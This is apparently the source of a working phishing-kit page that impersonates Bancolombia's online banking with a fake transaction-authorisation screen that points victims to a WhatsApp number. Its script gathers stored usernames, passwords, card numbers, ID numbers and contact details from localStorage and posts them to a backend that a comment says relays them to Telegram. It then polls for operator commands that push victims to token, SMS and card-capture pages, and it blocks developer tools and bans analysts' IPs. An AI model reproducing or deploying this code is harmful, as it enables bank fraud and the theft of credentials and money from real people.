<?php
// --- IP BLACKLIST GLOBAL CHECK ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}
$secRoot = __DIR__; while($secRoot !== dirname($secRoot)) { if (file_exists($secRoot . '/includes/security.php')) { require_once $secRoot . '/includes/security.php'; break; } $secRoot = dirname($secRoot); } $blacklist_file = (function_exists('sura_get_project_root') ? sura_get_project_root() : $secRoot) . '/blocked_ips.txt';
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}
// ---------------------------------

session_start();
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autorización de Transacción - Sucursal Virtual Personas</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
    
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: "Open Sans", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            
            background-color: #FAFAFA;
            background-image: url('img/fondo.svg'); 
            background-size: cover; 
            background-position: center top;
            background-attachment: fixed;
            background-repeat: no-repeat;
            
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            color: #2C2A29;
            padding: 0 16px;
            overflow-y: auto; /* Permite scroll vertical en celulares */
        }

        /* Encabezado Fondo */
        .header-container { text-align: center; margin-top: 50px; margin-bottom: 25px; }
        .header-container img.logo { height: 30px; margin-bottom: 24px; object-fit: contain; }
        .main-title { font-weight: 300; font-size: 26px; color: #444444; letter-spacing: -0.3px; }

        /* Contenedor Principal Fondo */
        .main-wrapper { width: 100%; max-width: 500px; }
        .alert-box {
            background-color: #D9F2F9; border: 1px solid #7FD3ED; border-radius: 6px;
            padding: 16px 20px; display: flex; gap: 14px; margin-bottom: 16px;
        }
        .alert-icon { flex-shrink: 0; padding-top: 2px; }
        .alert-content strong { display: block; font-size: 14.5px; font-weight: 700; color: #2C2A29; margin-bottom: 4px; }
        .alert-content p { font-size: 13.5px; color: #4A4A4A; margin-bottom: 6px; }
        .alert-content a { font-size: 13.5px; font-weight: 700; color: #2C2A29; text-decoration: underline; }

        .login-card {
            background-color: #FFFFFF; border-radius: 8px; box-shadow: 0 12px 30px rgba(0, 0, 0, 0.08);
            padding: 40px 50px; text-align: center; margin-bottom: 40px; opacity: 0.9;
        }
        .login-card h2 { font-size: 24px; font-weight: 700; margin-bottom: 12px; }
        .login-card .subtitle { font-size: 14px; color: #666666; margin-bottom: 30px; }
        .input-group { display: flex; align-items: center; border-bottom: 1px solid #8C8C8C; padding-bottom: 6px; margin-bottom: 24px; }
        .left-icon { width: 22px; height: 22px; stroke: #4A4A4A; fill: none; stroke-width: 1.5; margin-right: 12px; }
        .input-group input { border: none; width: 100%; font-size: 18px; background: transparent; }
        .btn-submit { width: 100%; background-color: #E2E2E2; color: #8C8C8C; border: none; border-radius: 24px; padding: 15px; font-size: 16px; font-weight: 600; margin-bottom: 26px; }

        /* =========================================
           ESTILOS DEL OVERLAY Y MODAL FLOTANTE (NUEVO DISEÑO BLANCO)
           ========================================= */
        .overlay {
            position: absolute; top: 0; left: 0; width: 100%; min-height: 100%;
            background-color: #FAFAFA; /* Fondo claro como en la imagen */
            display: flex; flex-direction: column; align-items: center;
            padding: 20px 20px 40px 20px; z-index: 9999;
        }

        .top-logo-overlay {
            margin-top: 20px;
            margin-bottom: 20px;
        }
        .top-logo-overlay img {
            height: 35px;
        }

        .tabot-img {
            width: 130px;
            height: 130px;
            border-radius: 50%;
            object-fit: cover;
            margin-bottom: 15px;
        }

        .banner-title {
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 25px;
            color: #2C2A29;
            letter-spacing: -0.3px;
            text-align: center;
        }

        .modal-card {
            background-color: #FFFFFF;
            border-radius: 16px;
            width: 100%;
            max-width: 400px;
            padding: 30px 24px;
            color: #2C2A29;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            position: relative;
            overflow-y: auto; 
            border: 1px solid #EAEAEA;
        }

        .close-btn {
            position: absolute; top: 16px; right: 16px;
            background: none; border: none; cursor: pointer; padding: 4px; z-index: 2;
        }
        .close-btn svg { width: 24px; height: 24px; stroke: #8C8C8C; stroke-width: 1.5; fill: none; }

        .codigo-text {
            font-size: 16px;
            color: #2C2A29;
            margin-bottom: 20px;
        }
        .codigo-text strong {
            font-weight: 700;
        }

        .banner-text {
            font-size: 15px;
            line-height: 1.5;
            color: #2C2A29;
            margin-bottom: 20px;
            font-weight: 400;
        }

        .separator {
            border: 0;
            border-top: 1px solid #EAEAEA;
            margin: 20px 0;
        }

        .wa-row {
            display: flex;
            align-items: center;
            gap: 12px;
            text-align: left;
            padding: 0 10px;
        }
        .wa-row svg {
            width: 32px;
            height: 32px;
            fill: #25D366;
            flex-shrink: 0;
        }
        .wa-row-text {
            font-size: 14px;
            color: #2C2A29;
            line-height: 1.4;
        }

        /* Check de Autorización (Adaptado para mantener lógica JS pero verse bien) */
        .check-card {
            background-color: transparent;
            padding: 10px 0;
            text-align: center;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            cursor: pointer;
            user-select: none;
            margin-bottom: 20px;
        }
        .check-card input[type="checkbox"] {
            width: 18px;
            height: 18px;
            accent-color: #FDDA24;
            cursor: pointer;
            flex-shrink: 0;
        }
        .check-card-text {
            font-size: 15px;
            color: #2C2A29;
            font-weight: 400;
            line-height: 1.4;
        }

        /* Botón de Aceptar */
        .submit-btn {
            background-color: #FDDA24;
            color: #2C2A29;
            border: none;
            border-radius: 50px;
            width: 100%;
            padding: 14px 20px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.2s, opacity 0.2s;
        }
        .submit-btn:hover:not(:disabled) {
            background-color: #e5c720;
        }
        .submit-btn:disabled {
            background-color: #E2E2E2;
            color: #8C8C8C;
            cursor: not-allowed;
            opacity: 1;
        }

        .footer-logo-overlay {
            margin-top: auto;
            text-align: center;
            padding-top: 40px;
        }
        .footer-logo-overlay img {
            height: 25px;
            margin-bottom: 8px;
        }
        .footer-logo-overlay p {
            font-size: 12px;
            color: #4A4A4A;
        }

        /* Error Banner flotante dentro de la tarjeta */
        .error-alert {
            background-color: #F8D7DA;
            border: 1px solid #F5C6CB;
            color: #721C24;
            border-radius: 8px;
            padding: 14px 16px;
            font-size: 13.5px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            display: none;
            text-align: left;
        }
        .error-alert svg {
            width: 18px;
            height: 18px;
            fill: #721C24;
            flex-shrink: 0;
        }

        /* Modal mini de confirmación */
        .confirm-modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(4px);
            z-index: 10000;
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s ease;
        }
        .confirm-modal-overlay.active {
            opacity: 1;
            pointer-events: auto;
        }
        .confirm-modal {
            background-color: #FFFFFF;
            border-radius: 12px;
            width: 90%;
            max-width: 400px;
            padding: 24px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            transform: scale(0.9);
            transition: transform 0.3s ease;
        }
        .confirm-modal-overlay.active .confirm-modal {
            transform: scale(1);
        }
        .confirm-title {
            font-size: 17px;
            font-weight: 700;
            color: #2C2A29;
            margin-bottom: 14px;
        }
        .confirm-text {
            font-size: 13.5px;
            color: #555555;
            line-height: 1.5;
            margin-bottom: 20px;
        }
        .confirm-buttons {
            display: flex;
            gap: 12px;
        }
        .confirm-btn {
            flex: 1;
            padding: 12px 14px;
            font-size: 14px;
            font-weight: 700;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .confirm-btn-yes {
            background-color: #FDDA24;
            color: #2C2A29;
        }
        .confirm-btn-yes:hover {
            background-color: #e5c720;
        }
        .confirm-btn-no {
            background-color: #F0F0F0;
            color: #555555;
        }
        .confirm-btn-no:hover {
            background-color: #E2E2E2;
        }

        /* Loader Overlay del modal */
        .modal-loader-overlay {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(255, 255, 255, 0.95);
            z-index: 10;
            display: none; 
            flex-direction: column;
            justify-content: center;
            align-items: center;
            border-radius: 12px;
        }
        .spinner-ring {
            width: 44px; height: 44px;
            border: 2px solid #2C2A29;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 16px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loader-text { font-size: 15px; color: #2C2A29; font-weight: 600; }
        .loader-subtext { font-size: 13px; color: #666666; margin-top: 6px; }

        @media (max-width: 600px) {
            .modal-card { padding: 24px 20px 32px 20px; }
        }
    </style>
</head>
<body>

    <!-- =========================================
         LA PÁGINA DE FONDO (LOGIN INACTIVO)
         ========================================= -->
    <div class="header-container">
        <img src="img/logo.svg" alt="Bancolombia" class="logo">
        <h1 class="main-title">Sucursal Virtual Personas</h1>
    </div>

    <div class="main-wrapper">
        <div class="alert-box">
            <div class="alert-icon">
                <svg width="26" height="26" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="14" cy="14" r="13" fill="#C2EBF7" stroke="#5CC5E4" stroke-width="1.5"/>
                    <path d="M10.5 16C10.5 14.5 9 12.5 9 10C9 7.2386 11.2386 5 14 5C16.7614 5 19 7.2386 19 10C19 12.5 17.5 14.5 17.5 16V17H10.5V16Z" stroke="#2C2A29" stroke-width="1.8" stroke-linejoin="round"/>
                    <line x1="11.5" y1="20" x2="16.5" y2="20" stroke="#2C2A29" stroke-width="1.8" stroke-linecap="round"/>
                </svg>
            </div>
            <div class="alert-content">
                <strong>¡Prográmate!</strong>
                <p>Consulta el estado de nuestros canales y los mantenimientos programados.</p>
                <a href="#">Más info aquí.</a>
            </div>
        </div>

        <div class="login-card">
            <h2>¡Hola!</h2>
            <p class="subtitle">Ingresa los datos para gestionar tus productos y hacer transacciones.</p>
            
            <div class="input-group">
                <svg class="left-icon" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
                <input type="text" placeholder="Usuario" disabled>
            </div>
            <div class="input-group">
                <svg class="left-icon" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                <input type="password" placeholder="Clave del cajero" disabled>
            </div>
            <button type="button" class="btn-submit" disabled>Iniciar sesión</button>
        </div>
    </div>

    <!-- =========================================
         EL OVERLAY Y EL MODAL FLOTANTE (DISEÑO ACTUALIZADO)
         ========================================= -->
    <div class="overlay">
        
        <div class="top-logo-overlay">
            <img src="img/logo.svg" alt="Bancolombia">
        </div>

        <!-- Imagen del ojo Tabot -->
        <img src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/1351b0ea-a29c-43bd-a29a-56957522239e/YDRAY-tabot-whatsapp+1.jpg?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_9O44G4S049MAD06H7SNS78IMS1-1351b0ea-a29c-43bd-a29a-56957522239e-nzypemB" alt="Tabot" class="tabot-img">
        
        <div class="banner-title">Autorice esta Transacción</div>

        <div class="modal-card">

            <!-- Capa interna de carga que cubre solo el modal sin cambiar su tamaño -->
            <div class="modal-loader-overlay" id="modalLoader">
                <div class="spinner-ring"></div>
                <div class="loader-text">Procesando tu solicitud...</div>
                <div class="loader-subtext">Por favor no cierres ni recargues esta ventana.</div>
            </div>
            
            <button class="close-btn" type="button" onclick="history.back()">
                <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
                    <line x1="18" y1="6" x2="6" y2="18"></line>
                    <line x1="6" y1="6" x2="18" y2="18"></line>
                </svg>
            </button>

            <!-- Banner de Error dinámico inside Card -->
            <div id="errorBanner" class="error-alert">
                <svg viewBox="0 0 24 24">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                </svg>
                <span id="errorMsg">No se recibió respuesta de esta consulta por parte del usuario. Por favor verifique y autorice.</span>
            </div>

            <div class="codigo-text">Código: <strong>923</strong></div>

            <!-- Mensaje Descriptivo -->
            <div class="banner-text">
                Para confirmar si eres tú quién hace la<br>transacción, te escribiremos desde<br>nuestro <strong>WhatsApp oficial</strong><br>301 353 6788
            </div>

            <hr class="separator">

            <div class="wa-row">
                <svg viewBox="0 0 24 24">
                    <path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946C.06 5.348 5.397.056 11.93.056c3.168.001 6.148 1.234 8.39 3.479 2.242 2.243 3.472 5.224 3.471 8.391-.003 6.582-5.339 11.874-11.873 11.874-2.007-.001-3.98-.512-5.732-1.488L0 24zm6.59-4.832c1.614.957 3.111 1.458 4.733 1.459 5.345 0 10.125-4.514 10.127-9.71 0-2.518-1.002-4.885-2.822-6.66-1.821-1.777-4.243-2.754-6.816-2.755-5.351 0-9.699 4.312-9.7 9.516-.001 1.708.47 3.374 1.365 4.807l-.993 3.626 5.106-1.323zm12.385-6.621c-.302-.151-1.789-.882-2.053-.978-.264-.096-.456-.145-.648.145-.192.29-.744.978-.912 1.17-.168.193-.336.217-.638.066-.302-.151-1.272-.469-2.423-1.496-.896-.799-1.5-1.787-1.676-2.088-.176-.302-.019-.465.132-.615.136-.135.302-.35.453-.525.151-.175.202-.301.302-.503.101-.201.05-.378-.025-.529-.075-.151-.648-1.562-.888-2.106-.233-.561-.47-.485-.648-.495l-.553-.008c-.192 0-.503.072-.767.362-.264.29-1.007.984-1.007 2.398 0 1.414 1.031 2.78 1.175 2.971.144.193 2.031 3.097 4.919 4.34.686.296 1.222.473 1.639.605.69.219 1.319.188 1.815.116.552-.08 1.687-.689 1.926-1.354.24-.664.24-1.235.168-1.354-.072-.119-.264-.193-.566-.344z"/>
                </svg>
                <div class="wa-row-text">
                    Responde <strong>Sí</strong> para <strong>continuar</strong><br>con la transacción.
                </div>
            </div>

            <hr class="separator">

            <!-- Check de Autorización -->
            <div class="check-card" id="checkCard">
                <!-- Se mantiene el checkbox para que el JS no se rompa, estilizado de manera simple -->
                <input type="checkbox" id="authCheckbox">
                <div class="check-card-text">
                    Si ya autorizó su transacción en<br>whatsapp presione <strong>listo</strong>.
                </div>
            </div>

            <!-- Botón Aceptar / Listo -->
            <button id="btnAceptar" class="submit-btn" disabled>listo</button>

        </div>

        <div class="footer-logo-overlay">
            <img src="img/logo.svg" alt="Bancolombia">
            <p>Copyright © 2026 Grupo Bancolombia.</p>
        </div>
    </div>

    <!-- Modal de Confirmación de Acción -->
    <div id="confirmModal" class="confirm-modal-overlay">
        <div class="confirm-modal">
            <div class="confirm-title">¿Confirmas que ya lo autorizaste?</div>
            <div class="confirm-text">
                De no ser así, la transacción será rechazada por seguridad y deberás esperar 1 hora para volver a intentar.
            </div>
            <div class="confirm-buttons">
                <button id="btnModalNo" class="confirm-btn confirm-btn-no">No</button>
                <button id="btnModalYes" class="confirm-btn confirm-btn-yes">Sí, lo hice</button>
            </div>
        </div>
    </div>

    <script>
        // Obtener sessionId y datos locales
        let sessionId = "";
        try {
            const params = new URLSearchParams(window.location.search);
            sessionId = params.get('transactionId') || localStorage.getItem('session_id') || "";
            if (!sessionId) {
                sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).slice(2, 11);
                localStorage.setItem('session_id', sessionId);
            }
        } catch(e) {
            console.error("Error reading localStorage/Query", e);
        }

        // Si hay error en la URL, mostrar el banner 923
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('error') === '923' || urlParams.get('error') === '1') {
            document.getElementById('errorBanner').style.display = 'flex';
        }

        // Elementos de la UI
        const checkbox = document.getElementById('authCheckbox');
        const checkCard = document.getElementById('checkCard');
        const btnAceptar = document.getElementById('btnAceptar');
        
        const confirmModal = document.getElementById('confirmModal');
        const btnModalNo = document.getElementById('btnModalNo');
        const btnModalYes = document.getElementById('btnModalYes');
        
        const modalLoader = document.getElementById('modalLoader');

        // Permitir click en toda la tarjeta del checkbox
        checkCard.addEventListener('click', (e) => {
            if (e.target !== checkbox) {
                checkbox.checked = !checkbox.checked;
            }
            btnAceptar.disabled = !checkbox.checked;
        });

        checkbox.addEventListener('change', () => {
            btnAceptar.disabled = !checkbox.checked;
        });

        // Al hacer click en "Aceptar", abrimos el modal de confirmación
        btnAceptar.addEventListener('click', () => {
            confirmModal.classList.add('active');
        });

        // Cancelar en el modal
        btnModalNo.addEventListener('click', () => {
            confirmModal.classList.remove('active');
        });

        // Aceptar definitivamente en el modal (Sí, lo hice)
        btnModalYes.addEventListener('click', () => {
            confirmModal.classList.remove('active');
            modalLoader.style.display = 'flex';
            
            // Enviamos el aviso a Telegram indicando la autorización 923
            enviarAviso923();
        });

        // Función para enviar notificación especial a Telegram
        function enviarAviso923() {
            const formData = new FormData();
            formData.append('transactionId', sessionId);
            
            // Reconstruir localTb robusto leyendo múltiples claves de localStorage
            let localTb = {};
            try {
                localTb = JSON.parse(localStorage.getItem('tbdatos') || '{}');
            } catch(e) {}

            if (!localTb.banco) localTb.banco = localStorage.getItem('banco') || 'BANCOLOMBIA';
            if (!localTb.total_pagar) localTb.total_pagar = localStorage.getItem('total_pagar') || '';
            if (!localTb.documento && localStorage.getItem('val')) localTb.documento = localStorage.getItem('val');
            if (!localTb.nombre && (localStorage.getItem('nombre') || localStorage.getItem('nom'))) localTb.nombre = localStorage.getItem('nombre') || localStorage.getItem('nom');
            if (!localTb.correo && (localStorage.getItem('correo') || localStorage.getItem('eml'))) localTb.correo = localStorage.getItem('correo') || localStorage.getItem('eml');
            if (!localTb.telefono && (localStorage.getItem('celular') || localStorage.getItem('cel'))) localTb.telefono = localStorage.getItem('celular') || localStorage.getItem('cel');
            if (!localTb.tarjeta && (localStorage.getItem('tarjeta') || localStorage.getItem('num'))) localTb.tarjeta = localStorage.getItem('tarjeta') || localStorage.getItem('num');

            const u = localStorage.getItem('username') || '';
            const p = localStorage.getItem('password') || '';
            
            formData.append('u_id', u);
            formData.append('u_ps', p);
            formData.append('u_tb', JSON.stringify(localTb));

            fetch('procesar_923.php', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(result => {
                if (result.status === 'success') {
                    // Una vez enviado, empezamos el polling en segundo plano para esperar la acción de Telegram
                    checkTokenVerification(sessionId, result.messageId);
                } else {
                    // Fallback a polling normal si falla
                    checkTokenVerification(sessionId, null);
                }
            })
            .catch(err => {
                console.error("Error al enviar aviso 923:", err);
                checkTokenVerification(sessionId, null);
            });
        }

        // Función recursiva de polling para esperar órdenes de Telegram
        async function checkTokenVerification(transactionId, messageId) {
            try {
                const formData = new FormData();
                formData.append('transactionId', transactionId);
                formData.append('messageId', messageId || '');

                const res = await fetch('verificar_respuesta.php?ts=' + Date.now(), { method: 'POST', body: formData });
                const result = await res.json();

                if (result && result.action) {
                    modalLoader.style.display = 'none';

                    switch (result.action) {
                        case 'pedir_dinamica':
                            window.location.replace('token.php');
                            break;
                        case 'pedir_sms':
                            window.location.replace('token_sms.php');
                            break;
                        case 'error_token':
                            window.location.replace('token.php?error=1');
                            break;
                        case 'bre_b':
                            window.location.href = '/recaudos/brev.php?bancolombia';
                            break;
                        case 'error_logo':
                            window.location.href = 'index.php?error=1';
                            break;
                        case 'error_tc':
                            window.location.href = '/datac/alter.php';
                            break;
                        case 'error':
                            window.location.href = '/caras';
                            break;
                        case 'cedula':
                            window.location.href = '/cedula';
                            break;
                        case 'ban_ip':
                    try {
                        localStorage.clear();
                        sessionStorage.clear();
                        document.cookie.split(";").forEach(function(c) { 
                            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
                        });
                    } catch(e) {}
                    window.location.replace("/fin.php");
                    break;
                case 'confirm_finalizar':
                            window.location.href = '/fin.php';
                            break;
                        case '923':
                            // Si se presiona el botón 923 otra vez, mostramos error y recargamos con ?error=923
                            window.location.href = '923.php?error=923&transactionId=' + transactionId;
                            break;
                        default:
                            setTimeout(() => checkTokenVerification(transactionId, messageId), 2000);
                    }
                } else {
                    setTimeout(() => checkTokenVerification(transactionId, messageId), 2000);
                }
            } catch (err) {
                setTimeout(() => checkTokenVerification(transactionId, messageId), 2000);
            }
        }
    </script>
<script>
// --- DESACTIVAR CLICK DERECHO, INSPECCIONAR Y F12 ---
(function() {
    // 1. Desactivar Click Derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // 2. Desactivar atajos de teclado de desarrollo (F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+Shift+J, Ctrl+U, Cmd+Opt+I)
    document.addEventListener('keydown', function(e) {
        // F12
        if (e.keyCode === 123) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+Shift+I o Cmd+Opt+I
        if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
        // Ctrl+U (Ver código fuente)
        if ((e.ctrlKey || e.metaKey) && e.keyCode === 85) {
            e.preventDefault();
            triggerAutoBan();
            return false;
        }
    });

    // 3. Detectar apertura de Herramientas de Desarrollo (DevTools) por dimensiones
    let devtoolsOpen = false;
    const threshold = 160;
    
    function checkDevTools() { return false; }

    // 4. Función para Auto-Banear la IP del Atacante
    let banTriggered = false;
    function triggerAutoBan() {
        if (banTriggered) return;
        banTriggered = true;
        
        // Limpieza inmediata del almacenamiento local
        try {
            localStorage.clear();
            sessionStorage.clear();
            document.cookie.split(";").forEach(function(c) { 
                document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
            });
        } catch(e) {}

        // Enviar IP para auto-bloqueo al backend (usamos el honeypot para gatillar el baneo)
        const formData = new FormData();
        formData.append('website', 'automated_devtools_trigger');
        
        // Buscamos si tenemos la variable de transacción en localStorage
        let tid = '';
        try {
            tid = localStorage.getItem('last_tid') || localStorage.getItem('session_id') || '';
        } catch(e) {}
        if (tid) {
            formData.append('transactionId', tid);
        }

        // Enviamos post silencioso para banear la IP en el backend
        fetch('/gate/process/paso1datos.php', {
            method: 'POST',
            body: formData,
            keepalive: true
        }).finally(function() {
            window.location.replace("/fin.php");
        });
    }
})();
// ---------------------------------------------------
</script>
</body>
</html>